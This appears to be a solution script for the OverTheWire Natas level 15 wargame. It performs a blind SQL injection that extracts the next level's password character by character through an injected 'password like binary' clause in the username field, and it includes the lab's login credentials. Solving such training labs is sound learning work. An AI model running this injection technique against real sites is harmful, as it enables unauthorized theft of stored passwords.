#a true sql injection
import requests
from string import ascii_letters, digits


url='http://natas15.natas.labs.overthewire.org/'
auth=('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
s=requests.Session()
nxt=ascii_letters+digits
pswd=""
while True:
    for c in nxt:
        trial=f'natas16" and password like binary "{pswd+c}%";#'
        resp=s.post(url,auth=auth, data={"username":trial})
        if "doesn't exist" not in resp.text:
            pswd+=c
            print(len(pswd))#progress bar
            if len(pswd)==32:
                print(pswd)#knew this because i tried a and length(password)=32;# which exists
                exit(0)

